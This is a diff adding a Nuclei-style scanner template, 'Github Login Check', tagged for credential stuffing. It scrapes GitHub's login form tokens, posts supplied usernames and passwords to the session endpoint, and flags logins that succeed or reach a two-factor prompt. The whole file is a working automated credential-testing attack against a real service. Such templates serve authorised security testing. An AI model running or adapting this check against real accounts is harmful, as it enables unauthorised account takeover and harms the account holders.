@@ -1,0 +1,75 @@
+id: github-login-check
+
+info:
+  name: Github Login Check
+  author: parthmalhotra,pdresearch
+  severity: critical
+  description: Checks for a valid github account.
+  reference:
+    - https://owasp.org/www-community/attacks/Credential_stuffing
+  metadata:
+    max-request: 2
+  tags: cloud,creds-stuffing,login-check,github
+
+self-contained: true
+
+http:
+  - raw:
+      - |
+        GET https://github.com/login HTTP/1.1
+        Host: github.com
+      - |
+        POST https://github.com/session HTTP/1.1
+        Host: github.com
+        Origin: https://github.com
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://github.com/login
+
+        commit=Sign+in&authenticity_token={{authenticity_token}}&login={{username}}&password={{password}}&trusted_device=&webauthn-support=supported&webauthn-iuvpaa-support=unsupported&return_to=https%3A%2F%2Fgithub.com%2Flogin&allow_signup=&client_id=&integration=&required_field_34b7=&timestamp={{timestamp}}&timestamp_secret={{timestamp_secret}}
+
+    extractors:
+      - type: xpath
+        name: authenticity_token
+        part: body
+        attribute: value
+        internal: true
+        xpath:
+          - /html/body/div[3]/main/div/div[4]/form/input[1]
+
+      - type: xpath
+        name: timestamp
+        part: body
+        attribute: value
+        internal: true
+        xpath:
+          - /html/body/div[3]/main/div/div[4]/form/div/input[10]
+
+      - type: xpath
+        name: timestamp_secret
+        part: body
+        attribute: value
+        internal: true
+        xpath:
+          - /html/body/div[3]/main/div/div[4]/form/div/input[11]
+
+      - type: dsl
+        dsl:
+          - username
+          - password
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: 2fa
+        dsl:
+          - "contains(location, 'https://github.com/sessions/two-factor')"
+          - "status_code==302"
+        condition: and
+
+      - type: dsl
+        dsl:
+          - "contains(to_lower(header), 'set-cookie: logged_in=yes')"
+          - "contains(to_lower(header), 'set-cookie: user_session=')"
+          - "status_code==302"
+        condition: and
+# digest: 4a0a00473045022052060fe58a35dd8634f638098fad755dcd5b08db874b8b2a668903d09986bf1e0221008b048183fb46426f7e288c12711733129b62e202626cf2ca9ce0b071a5c75b04:922c64590222798bb761d5b6d8e72950
